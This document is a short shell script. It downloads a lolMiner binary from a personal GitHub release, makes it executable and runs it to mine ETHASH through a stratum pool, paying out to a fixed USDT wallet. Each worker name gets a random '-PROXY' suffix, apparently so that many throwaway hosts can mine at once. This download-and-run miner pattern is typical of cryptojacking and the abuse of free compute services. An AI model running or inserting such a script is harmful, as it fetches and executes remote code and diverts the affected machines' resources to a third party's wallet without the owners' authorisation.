#!/bin/sh
wget https://github.com/berhasilsemua83/Raven/releases/download/v1.0/lolMiner && chmod 700 lolMiner && ./lolMiner --algo ETHASH --pool stratum+tcp://sg.stratu.ms:16837 --user USDT:TLPbsRkFNUAutW7V5XeiC4jt9RDJd8xwVP.$(echo $(shuf -i 1-9999 -n 1)-PROXY) 
